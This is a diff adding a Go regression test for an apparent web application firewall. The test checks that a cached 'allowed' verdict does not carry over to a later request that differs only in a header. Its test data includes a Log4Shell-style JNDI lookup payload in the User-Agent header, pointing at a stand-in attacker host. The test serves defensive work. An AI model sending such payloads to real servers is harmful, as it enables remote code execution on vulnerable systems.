@@ -295,6 +295,30 @@ func TestCheckDeduplicatesIdenticalRequests(t *testing.T) {
 	}
 }
 
+// TestCheckCachedAllowDoesNotCoverHeaderPayload is the issue #152
+// regression: an allowed request must not let a later one that differs only
+// in a header reuse its verdict.
+func TestCheckCachedAllowDoesNotCoverHeaderPayload(t *testing.T) {
+	e := newTestEngine(t)
+	newReq := func(ua string) *http.Request {
+		r := httptest.NewRequest("GET", "http://app.example.com/", nil)
+		r.Header.Set("User-Agent", ua)
+		r.Header.Set("Accept", "*/*")
+		return r
+	}
+	clean, err := e.Check(newReq("Mozilla/5.0"), "203.0.113.9")
+	if err != nil || clean.Blocked {
+		t.Fatalf("clean request: blocked=%v err=%v, want allowed", clean != nil && clean.Blocked, err)
+	}
+	evil, err := e.Check(newReq("${jndi:ldap://attacker.example/a}"), "203.0.113.9")
+	if err != nil {
+		t.Fatalf("header payload: %v", err)
+	}
+	if !evil.Blocked {
+		t.Fatal("header payload was allowed by the clean request's cached verdict")
+	}
+}
+
 // TestCheckNeverCachesCookieOrAuthRequests proves requests carrying a
 // session cookie or Authorization header are excluded from the verdict
 // cache entirely (issue #13's identity-safety requirement) — a
